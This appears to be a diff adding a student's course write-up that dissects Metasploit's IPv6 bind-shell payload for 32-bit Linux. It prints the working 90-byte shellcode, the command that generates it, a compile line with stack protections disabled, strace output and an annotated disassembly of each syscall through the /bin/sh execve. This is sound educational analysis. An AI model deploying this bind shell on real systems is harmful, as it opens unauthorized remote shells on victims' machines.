@@ -1,0 +1,430 @@
+<h4>Assignment #5.3</h4>
+<p>
+	For Assignment 5.3 I have selected the more complex ipv6_bind() shellcode
+	from msfpayload. I have chosen this shellcode primarily because I don't
+	do much with IPv6 near the bare metal, and this will be as much a learning
+	exercise for my networking skill set as it will be for shellcode analysis.
+</p>
+<p>
+	I have generated the IPv6 bind code with the following command and output:
+</p>
+<pre class="prettyprint linenums">
+$ msfpayload linux/x86/shell_bind_ipv6_tcp C
+/*
+ * linux/x86/shell_bind_ipv6_tcp - 90 bytes
+ * http://www.metasploit.com
+ * VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false, 
+ * PrependSetreuid=false, PrependSetuid=false, 
+ * PrependSetresgid=false, PrependSetregid=false, 
+ * PrependSetgid=false, PrependChrootBreak=false, 
+ * AppendExit=false, InitialAutoRunScript=, AutoRunScript=
+ */
+unsigned char buf[] = 
+"\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a\x66\x58\xcd\x80\x96"
+"\x99\x52\x52\x52\x52\x52\x52\x66\x68\x11\x5c\x66\x68\x0a\x00"
+"\x89\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x6a\x66\x58\xcd\x80\xb0"
+"\x66\xb3\x04\xcd\x80\x52\x52\x56\x89\xe1\x43\xb0\x66\xcd\x80"
+"\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68"
+"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+$
+</pre>
+<p>
+	To begin I have loaded this code into the shellcode.c
+	program for testing and compiled the code with:
+</p>
+<pre class="prettyprint linenums">
+gcc -ggdb -z execstack -fno-stack-protector shellcode.c -o sc
+</pre>
+<p>
+	Unlike the previous shellcodes I have no experience with
+	IPv6 binding, so it is necessary to start from scratch.
+</p>
+<p>
+	strace shows the following:
+</p>
+<pre class="prettyprint linenums">
+socket(PF_INET6, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET6, sin6_port=htons(4444), inet_pton(AF_INET6, "::", &sin6_addr), sin6_flowinfo=0, sin6_scope_id=0}, 28) = 0
+listen(3, 3218834324)                   = 0
+accept(3, 0, NULL)                      = 4
+dup2(4, 3)                              = 3
+dup2(4, 2)                              = 2
+dup2(4, 1)                              = 1
+dup2(4, 0)                              = 0
+execve("/bin//sh", ["/bin//sh"], [/* 0 vars */]) = 0
+</pre>
+<p>
+	This is actually going to be easier to analyse than
+	previously thought, mostly because the majority of the
+	code is similar to a regular bind shell. The main
+	call differences are in socket() and bind().
+</p>
+<p>
+	The ndisasm output of the shellcode will be most
+	helpful to diagnose this as it easily breaks up
+	the location of the int 0x80 calls so that it is
+	possible to analyse the shellcode syscall by syscall.
+</p>
+<p>
+	This is the largest of the 3 shellcodes I am
+	analysing for Assessment 5, however it is also going to
+	be simpler for a lot of it due to the similarities
+	with IPv4 bindshell code (which has already been
+	written for assignment 1).
+</p>
+<p>
+	The full ndisasm listing:
+</p>
+<pre class="prettyprint linenums">
+$ msfpayload linux/x86/shell_bind_ipv6_tcp R | ndisasm -u -
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  43                inc ebx
+00000004  53                push ebx
+00000005  6A0A              push byte +0xa
+00000007  89E1              mov ecx,esp
+00000009  6A66              push byte +0x66
+0000000B  58                pop eax
+0000000C  CD80              int 0x80
+0000000E  96                xchg eax,esi
+0000000F  99                cdq
+00000010  52                push edx
+00000011  52                push edx
+00000012  52                push edx
+00000013  52                push edx
+00000014  52                push edx
+00000015  52                push edx
+00000016  6668115C          push word 0x5c11
+0000001A  66680A00          push word 0xa
+0000001E  89E1              mov ecx,esp
+00000020  6A1C              push byte +0x1c
+00000022  51                push ecx
+00000023  56                push esi
+00000024  89E1              mov ecx,esp
+00000026  43                inc ebx
+00000027  6A66              push byte +0x66
+00000029  58                pop eax
+0000002A  CD80              int 0x80
+0000002C  B066              mov al,0x66
+0000002E  B304              mov bl,0x4
+00000030  CD80              int 0x80
+00000032  52                push edx
+00000033  52                push edx
+00000034  56                push esi
+00000035  89E1              mov ecx,esp
+00000037  43                inc ebx
+00000038  B066              mov al,0x66
+0000003A  CD80              int 0x80
+0000003C  93                xchg eax,ebx
+0000003D  59                pop ecx
+0000003E  6A3F              push byte +0x3f
+00000040  58                pop eax
+00000041  CD80              int 0x80
+00000043  49                dec ecx
+00000044  79F8              jns 0x3e
+00000046  682F2F7368        push dword 0x68732f2f
+0000004B  682F62696E        push dword 0x6e69622f
+00000050  89E3              mov ebx,esp
+00000052  50                push eax
+00000053  53                push ebx
+00000054  89E1              mov ecx,esp
+00000056  B00B              mov al,0xb
+00000058  CD80              int 0x80
+$
+</pre>
+<p>
+	Breaking this code down syscall by syscall:
+</p>
+<p>
+	The following code provides initalisation for the
+	registers and begins by creating the socket.
+</p>
+<p>
+	According to /usr/include/i386-linux-gnu/bits/socket.h
+	0xa (10) is PF_INET6. This is in alignment with this
+	shellcode being an IPv6 bindshell.
+</p>
+<p>
+	Because we are using a 32 bit operating system there is
+	no generic call for socket() so we have to use the
+	socketcall() interface. This is the 0x66 that is being
+	pushed into EAX. man 2 socket defines socket as:
+</p>
+<pre class="prettyprint linenums">
+int socket(int domain, int type, int protocol);
+</pre>
+<p>
+	Our arguments for this int 0x80 are:
+</p>
+<pre>
+EAX	0x66 (socketcall())
+EBX	0x01
+ECX	pointer to stack (which contains: PF_INET6, 1, 0 )
+</pre>
+<p>
+	After this code executes, the sockfd returned
+	by socket() is saved in ESI
+</p>
+<pre class="prettyprint">
+00000000  31DB              xor ebx,ebx
+00000002  53                push ebx
+00000003  43                inc ebx
+00000004  53                push ebx
+00000005  6A0A              push byte +0xa
+00000007  89E1              mov ecx,esp
+00000009  6A66              push byte +0x66
+0000000B  58                pop eax
+0000000C  CD80              int 0x80
+0000000E  96                xchg eax,esi
+</pre>
+<p>
+	The next chunk of code is the largest block in the
+	analysis. It is so large because it is the sockaddr
+	code for IPv6. An example of the usage for struct
+	sockaddr_in6 can be found
+	<?php
+		echo anchor("http://pic.dhe.ibm.com/infocenter/iseries/v6r1m0/index.jsp?topic=/rzab6/xacceptboth.htm",
+			"At the IBM website for socket programming");
+	?>.
+</p>
+<p>
+	A description of the sockaddr_in6 structure can be
+	found in man 7 ipv6, however I have put the relevant
+	structure here for reference:
+</p>
+<pre class="prettyprint linenums">
+struct sockaddr_in6 {
+    sa_family_t     sin6_family;   /* AF_INET6 */
+    in_port_t       sin6_port;     /* port number */
+    uint32_t        sin6_flowinfo; /* IPv6 flow information */
+    struct in6_addr sin6_addr;     /* IPv6 address */
+    uint32_t        sin6_scope_id; /* Scope ID (new in 2.4) */
+};
+
+struct in6_addr {
+    unsigned char   s6_addr[16];   /* IPv6 address */
+};
+</pre>
+<p>
+	Here is the code for this chunk of code. Based on our strace
+	and the size of the chunk we assume it will be a bind() call.
+</p>
+<pre class="prettyprint">
+0000000F  99                cdq
+00000010  52                push edx
+00000011  52                push edx
+00000012  52                push edx
+00000013  52                push edx
+00000014  52                push edx
+00000015  52                push edx
+00000016  6668115C          push word 0x5c11
+0000001A  66680A00          push word 0xa
+0000001E  89E1              mov ecx,esp
+00000020  6A1C              push byte +0x1c
+00000022  51                push ecx
+00000023  56                push esi
+00000024  89E1              mov ecx,esp
+00000026  43                inc ebx
+00000027  6A66              push byte +0x66
+00000029  58                pop eax
+0000002A  CD80              int 0x80
+</pre>
+<p>
+	Not small, but thankfully not too difficult to look at either.
+</p>
+<p>
+	It may be helpful to refer to the bindshell code I have
+	written for
+	<?php
+		echo anchor( site_url("/slae/exam/1"), "Assignment #1" );
+	?>
+	as a point of reference here. First, here is the structure
+	of an IPv4 address:
+</p>
+<pre class="prettyprint linenums">
+struct sockaddr_in {
+	sa_family_t    sin_family; /* address family: AF_INET */
+	in_port_t      sin_port;   /* port in network byte order */
+	struct in_addr sin_addr;   /* internet address */
+};
+
+struct in_addr {
+	uint32_t       s_addr;     /* address in network byte order */
+};
+</pre>
+<p>
+	Notice that the IPv4 sockaddr_in structure is far smaller
+	than the IPv6 one. Let us make the assumption that all the
+	code in our current chunk up to 0x01A is setting up our
+	IPv6 sockaddr structure. If this is the case, the "first"
+	two arguments to the structure are the last two to be pushed
+	to the stack.
+</p>
+<p>
+	The two arguments then are:
+</p>
+<pre class="prettyprint linenums">
+sa_family_t     sin6_family;   /* AF_INET6 */
+in_port_t       sin6_port;     /* port number */
+</pre>
+<p>
+	Which, based on the code chunk, translates to the following
+	decimal representations:
+</p>
+<pre class="prettyprint linenums">
+sa_family_t	10;	/* AF_INET6 */
+in_port_t	4444;	/* port number 4444 */
+</pre>
+<p>
+	0xA is decimal 10. Decimal 10 is defined as PF_INET6 in the
+	/usr/include/i386-linux-gnu/bits/socket.h file. AF_INET6 and
+	PF_INET6 are interchangeable for this type of socket programming
+	so the discrepancy in the manual page can be ignored.
+</p>
+<p>
+	in_port_t is 0x5c11, which should be reversed before converting
+	to decimal. Reversed it is 0x115c which is decimal 4444, the
+	port number for our generated shellcode.
+</p>
+<p>
+	Continuing with our chunk of code now that it definitely looks
+	like we have created a sockaddr_in6 structure in assembly:
+</p>
+<pre class="prettyprint linenums">
+0000001E  89E1              mov ecx,esp
+00000020  6A1C              push byte +0x1c
+00000022  51                push ecx
+00000023  56                push esi
+00000024  89E1              mov ecx,esp
+00000026  43                inc ebx
+00000027  6A66              push byte +0x66
+00000029  58                pop eax
+0000002A  CD80              int 0x80
+</pre>
+<p>
+	ECX points to the sockaddr_in6 structure. We push byte 0x1C to
+	the stack (and assume that this is the same as our assignment 1
+	bindshell - the sizeof() value for sockaddr_in6), then push ECX
+	to point to our sockaddr_in6, ESI is our socket filedescriptor
+	as was saved at the end of the first chunk of code. ECX now
+	points to the whole lot of the stack, so we just need to generate
+	the bind information for socketcall(), set socketcall() and go.
+</p>
+<p>
+	The inc ebx statement increases our EBX pointer to 2. This sets
+	EBX to be "bind" exactly as it does in the IPv4 bindshell. The
+	push/ pop generates socketcall() and int 0x80 makes it all happen.
+</p>
+<p>
+	According to strace our next call is going to be listen(). As we
+	know this is going to be the same as for our IPv4 bindshell in
+	Assignment #1 this will be simple to look at.
+</p>
+<pre class="prettyprint linenums">
+0000002C  B066              mov al,0x66
+0000002E  B304              mov bl,0x4
+00000030  CD80              int 0x80
+</pre>
+<p>
+	Where I have tried to be creative with my values, metasploit
+	is taking no changes, AL is set to 0x66, BL is set to 4 (which
+	we know is our number for listen(), and listen is called.
+</p>
+<p>
+	Before looking at the accept call, remember that we have not
+	yet moved anything into EDX, so it is still null. accept()
+	can be called as it is defined in man 2 accept, or with null
+	values for everything except the incoming socket. It appears
+	thus in my original IPv4 bindshell
+</p>
+<pre class="prettyprint linenums">
+clientfd = accept( sockfd, 0, 0 );
+</pre>
+<p>
+	Here are the arguments being delivered to our next socketcall().
+	Note the xchg at the bottom, which is moving our returned socket
+	(clientfd) into EBX. Metasploit is pushing them the same way that
+	I have done so for my bindshell. Note that because listen() and
+	bind have not returned a socket, our original socket is still in
+	ESI.
+</p>
+<p>
+	The accept() code is actually pretty standard then. EBX needs to
+	be 5 for accept(), ECX will point at the stack arguments for
+	accept(), and EAX needs to be 0x66 for socketcall() to be called.
+</p>
+<pre class="prettyprint linenums">
+00000032  52                push edx
+00000033  52                push edx
+00000034  56                push esi
+00000035  89E1              mov ecx,esp
+00000037  43                inc ebx
+00000038  B066              mov al,0x66
+0000003A  CD80              int 0x80
+0000003C  93                xchg eax,ebx
+</pre>
+<p>
+	We are almost complete. Now that we have set up
+	the socket, bound it to a port, listened for and
+	accepted a connection we need to duplicate
+	the standard file descripters, and execute our shell
+</p>
+<p>
+	Because the last thing pushed onto our stack was
+	the socketfd, and because they are integers as
+	defined in their respective manual pages, the metasploit
+	payload pop's this integer into ECX and uses it for a
+	loop counter.
+</p>
+<p>
+	Here is the dup2 code from the shellcode. 0x3f is syscall
+	63, which is dup2. The jns will jump back to the push byte
+	line until we have completed the dup2 descriptor loop.
+</p>
+<pre class="prettyprint linenums">
+0000003D  59                pop ecx
+0000003E  6A3F              push byte +0x3f
+00000040  58                pop eax
+00000041  CD80              int 0x80
+00000043  49                dec ecx
+00000044  79F8              jns 0x3e
+</pre>
+<p>
+	It is important to note that if the sockfd descriptor is
+	sufficiently high, this code will loop through every
+	single descriptor it can find and clone their output to
+	the socket file descriptor saved in EBX.
+</p>
+<p>
+	Finally, after all of the descriptors have been cloned
+	EAX will be 0 (as this was the last descriptor returned
+	by the dup2 call - see the explanation in my original
+	IPv4 bindshell), so the following execve() code is the
+	height of simplicity.
+</p>
+<p>
+	Simply push /bin//sh onto the stack, push a null and the
+	location of /bin//sh as the execve arguments, set EAX
+	to the execve() call, and finally execute.
+</p>
+<pre class="prettyprint linenums">
+00000046  682F2F7368        push dword 0x68732f2f
+0000004B  682F62696E        push dword 0x6e69622f
+00000050  89E3              mov ebx,esp
+00000052  50                push eax
+00000053  53                push ebx
+00000054  89E1              mov ecx,esp
+00000056  B00B              mov al,0xb
+00000058  CD80              int 0x80
+</pre>
+<p>
+	That's the complete bindshell in IPv6. Of course no analysis
+	would be complete without making sure we are right, so here
+	is the LibEMU graph output.
+</p>
+<div class="pagination-centered">
+	<img src="<?php echo base_url(); ?>/exam/slae-431-5.3.png" title="LibEMU output" />
+</div>
+<p>
+	Looks like I was correct :)
+</p>
